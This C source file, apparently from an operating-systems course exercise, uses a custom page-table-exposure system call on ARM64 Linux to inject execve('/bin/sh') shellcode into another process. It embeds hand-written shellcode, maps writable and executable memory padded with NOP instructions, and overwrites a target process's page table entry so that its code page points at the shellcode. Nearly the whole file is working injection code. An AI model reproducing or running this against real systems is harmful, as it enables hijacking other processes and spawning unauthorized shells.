#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/mman.h>

struct expose_pte_args {
	//PID of the target task to expose pte (can be the caller task or others)
        pid_t pid;
	//begin userspace VA of the flattened page table
        unsigned long begin_fpt_vaddr;
	//end userspace VA of the flattened page table
        unsigned long end_fpt_vaddr;
	//begin userspace VA of the remapped PTE table
        unsigned long begin_pte_vaddr;
	//end userspace VA of the remapped PTE table
        unsigned long end_pte_vaddr;
	//begin of userspace VA to expose PTE mappings
        unsigned long begin_vaddr;
	//end of userspace VA to expose PTE mappings
        unsigned long end_vaddr;
};

extern void shellcode();
__asm__(".global shellcode\n"
	"shellcode:\n\t"
	/* push b'/bin///sh\x00' */
	/* Set x14 = 8299904519029482031 = 0x732f2f2f6e69622f */
	"mov  x14, #25135\n\t"
	"movk x14, #28265, lsl #16\n\t"
	"movk x14, #12079, lsl #0x20\n\t"
	"movk x14, #29487, lsl #0x30\n\t"
	"mov  x15, #104\n\t"
	"stp x14, x15, [sp, #-16]!\n\t"
	/* execve(path='sp', argv=0, envp=0) */
	"mov  x0, sp\n\t"
	"mov  x1, xzr\n\t"
	"mov  x2, xzr\n\t"
	/* call execve() */
	"mov  x8, #221\n\t" // SYS_execve
	"svc 0");

char *create_shellcode(unsigned long len) {
	int i;
	char *shellcode_addr;

	// allocate memory page
	shellcode_addr = (char*)mmap(NULL, len,
			PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

	if (!shellcode_addr) {
		fprintf(stderr, "error: %s\n", strerror(errno));
		exit(-1);
	};

	// fill memory with nop instructions
	for (i = 0; i < len/4; i++) {
		((int*)shellcode_addr)[i] = 0xd503201f;  // nop opcode
	};

	// copy shellcode to memory page
	// TODO: replace |0x100| with your shellcode length
	memcpy(shellcode_addr + len - 0x100, &shellcode, 0x100);

	return shellcode_addr;
}

#define PMD_SHIFT 21
#define PAGE_SHIFT 12
#define PTRS_PER_PTE 512
#define PTRS_PER_PMD 512
#define PAGE_SIZE 4096

int va_inspection(pid_t pid, unsigned long begin_vaddr, unsigned long end_vaddr) {

	/* allocate memory for flatten table & remapped table
	 * void *mmap(void *addr, size_t length, int prot, int flags,
	 *	int fd, off_t offset);
	 */
	
	// Check align 4KB
	if ((end_vaddr - begin_vaddr) & 0x000000000fff)
		return -EINVAL;

	// calculate how many PTE from begin_vaddr to end_vaddr
	unsigned long pte_count = 1 + ((end_vaddr >> PMD_SHIFT) - (begin_vaddr >> PMD_SHIFT));
	// printf("pte_count: %ld\n", pte_count);
	unsigned long begin_fpt_vaddr = (unsigned long)mmap(NULL, pte_count * 8,
			PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (!begin_fpt_vaddr) {
		fprintf(stderr, "error: %s\n", strerror(errno));
		exit(-1);
	};
	unsigned long end_fpt_vaddr = begin_fpt_vaddr + pte_count * 8;
	unsigned long begin_pte_vaddr = (unsigned long)mmap(NULL, pte_count * PAGE_SIZE,
			PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (!begin_pte_vaddr) {
		fprintf(stderr, "error: %s\n", strerror(errno));
		exit(-1);
	};
	unsigned long end_pte_vaddr = begin_pte_vaddr + pte_count * PAGE_SIZE;
	
	/* set arguments by inspecting the /proc/[PID]/maps
	 * the code section is at top r-xp part
	 */
	// printf("begin_fpt_vaddr=%lx\nend_fpt_vaddr=%lx\nbegin_pte_vaddr=%lx\nend_pte_vaddr=%lx\nbegin_vaddr=%lx\nend_vaddr=%lx\n"
	// ,begin_fpt_vaddr,end_fpt_vaddr,begin_pte_vaddr,end_pte_vaddr, begin_vaddr, end_vaddr);
	struct expose_pte_args args = {
		pid,
		begin_fpt_vaddr,
		end_fpt_vaddr,
		begin_pte_vaddr,
		end_pte_vaddr,
		begin_vaddr,
		end_vaddr
	};

	// system call
	int ret = syscall(436, &args);

	unsigned long va = args.begin_vaddr, pa, fpt_offset, pte_offset, pte_addr, *pte_p;
	unsigned long idx = 1;
	for(; va < args.end_vaddr; va+=PAGE_SIZE, idx++) {

		fpt_offset = (va >> PMD_SHIFT) - (args.begin_vaddr >> PMD_SHIFT);
		pte_addr = *((unsigned long*)(args.begin_fpt_vaddr) + fpt_offset);
		if(pte_addr) {
			pte_p = (unsigned long*)pte_addr;
			pte_offset = ((va) >> PAGE_SHIFT) & (PTRS_PER_PTE - 1);
			printf("va%ld %lx pa%ld %lx\n", idx, va, idx, *(pte_p + pte_offset));
		} else {
			printf("va%ld %lx pa%ld not exists.\n", idx, va, idx);
		}
	}
	return ret;
}

unsigned long *get_target_pte_p(pid_t pid, unsigned long begin_vaddr, unsigned long end_vaddr) {

	/* allocate memory for flatten table & remapped table
	 * void *mmap(void *addr, size_t length, int prot, int flags,
	 *	int fd, off_t offset);
	 */

	// calculate how many PTE from begin_vaddr to end_vaddr
	unsigned long pte_count = 1 + ((end_vaddr >> PMD_SHIFT) - (begin_vaddr >> PMD_SHIFT));
	// printf("pte_count: %ld\n", pte_count);
	unsigned long begin_fpt_vaddr = (unsigned long)mmap(NULL, pte_count * 8,
			PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (!begin_fpt_vaddr) {
		fprintf(stderr, "error: %s\n", strerror(errno));
		exit(-1);
	};
	unsigned long end_fpt_vaddr = begin_fpt_vaddr + pte_count * 8;
	unsigned long begin_pte_vaddr = (unsigned long)mmap(NULL, pte_count * PAGE_SIZE,
			PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (!begin_pte_vaddr) {
		fprintf(stderr, "error: %s\n", strerror(errno));
		exit(-1);
	};
	unsigned long end_pte_vaddr = begin_pte_vaddr + pte_count * PAGE_SIZE;
	
	/* set arguments by inspecting the /proc/[PID]/maps
	 * the code section is at top r-xp part
	 */
	// printf("begin_fpt_vaddr=%lx\nend_fpt_vaddr=%lx\nbegin_pte_vaddr=%lx\nend_pte_vaddr=%lx\nbegin_vaddr=%lx\nend_vaddr=%lx\n"
	// ,begin_fpt_vaddr,end_fpt_vaddr,begin_pte_vaddr,end_pte_vaddr, begin_vaddr, end_vaddr);
	struct expose_pte_args args = {
		pid,
		begin_fpt_vaddr,
		end_fpt_vaddr,
		begin_pte_vaddr,
		end_pte_vaddr,
		begin_vaddr,
		end_vaddr
	};

	// system call
	int ret = syscall(436, &args);

	unsigned long va = args.begin_vaddr, pa, fpt_offset, pte_offset, pte_addr, *pte_p;
	fpt_offset = (va >> PMD_SHIFT) - (args.begin_vaddr >> PMD_SHIFT);
	pte_addr = *((unsigned long*)(args.begin_fpt_vaddr) + fpt_offset);
	if(pte_addr) {
		pte_p = (unsigned long*)pte_addr;
		pte_offset = ((va) >> PAGE_SHIFT) & (PTRS_PER_PTE - 1);
		pa = *(pte_p + pte_offset);
		printf("va m%lx pa %lx\n", va, pa);
	} else {
		printf("va %lx pa not exists.\n", va);
	}
	return pte_p + pte_offset;
}

int code_injection(pid_t sc_pid, unsigned long sc_begin, unsigned long *target_pte_p) {

	// calculate how many PTE from begin_vaddr to end_vaddr
	unsigned long pte_count = 1 + (((sc_begin + PAGE_SIZE) >> PMD_SHIFT) - (sc_begin >> PMD_SHIFT));
	// printf("pte_count: %ld\n", pte_count);
	unsigned long begin_fpt_vaddr = (unsigned long)mmap(NULL, pte_count * 8,
			PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (!begin_fpt_vaddr) {
		fprintf(stderr, "error: %s\n", strerror(errno));
		exit(-1);
	};
	unsigned long end_fpt_vaddr = begin_fpt_vaddr + pte_count * 8;
	unsigned long begin_pte_vaddr = (unsigned long)mmap(NULL, pte_count * PAGE_SIZE,
			PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (!begin_pte_vaddr) {
		fprintf(stderr, "error: %s\n", strerror(errno));
		exit(-1);
	};
	unsigned long end_pte_vaddr = begin_pte_vaddr + pte_count * PAGE_SIZE;
	
	/* set arguments by inspecting the /proc/[PID]/maps
	 * the code section is at top r-xp part
	 */
	// printf("begin_fpt_vaddr=%lx\nend_fpt_vaddr=%lx\nbegin_pte_vaddr=%lx\nend_pte_vaddr=%lx\nbegin_vaddr=%lx\nend_vaddr=%lx\n"
	// ,begin_fpt_vaddr,end_fpt_vaddr,begin_pte_vaddr,end_pte_vaddr, begin_vaddr, end_vaddr);
	struct expose_pte_args args = {
		sc_pid,
		begin_fpt_vaddr,
		end_fpt_vaddr,
		begin_pte_vaddr,
		end_pte_vaddr,
		sc_begin,
		sc_begin + PAGE_SIZE
	};

	int ret = syscall(436, &args);
	printf("syscall ret: %d\n",ret);
	unsigned long va = sc_begin, pa, fpt_offset, pte_offset, pte_addr, *pte_p;
	fpt_offset = (va >> PMD_SHIFT) - (args.begin_vaddr >> PMD_SHIFT);
	pte_addr = *((unsigned long*)(args.begin_fpt_vaddr) + fpt_offset);
	if(pte_addr) {
		pte_p = (unsigned long*)pte_addr;
		pte_offset = ((va) >> PAGE_SHIFT) & (PTRS_PER_PTE - 1);
		printf("va %lx pa %lx\n", va, *(pte_p + pte_offset));
	} else {
		printf("pa not exists.\n");
	}
	*target_pte_p = *(pte_p + pte_offset);

	return 0;
}

int main(int argc, char* argv[])
{
	int ret = 0, len;

	// Virtual Address Space Inspection
	unsigned long *target_pte_p = get_target_pte_p((pid_t)atoi(argv[1]), strtoul(argv[2], NULL, 16), strtoul(argv[3], NULL, 16));
	printf("expose pte ret: %d\n",ret);

	// Code Injection
	ret = code_injection((pid_t)atoi(argv[4]), strtoul(argv[5], NULL, 16), target_pte_p);
	printf("code injection ret: %d\n",ret);
	// while (1) {}
	return ret;
}
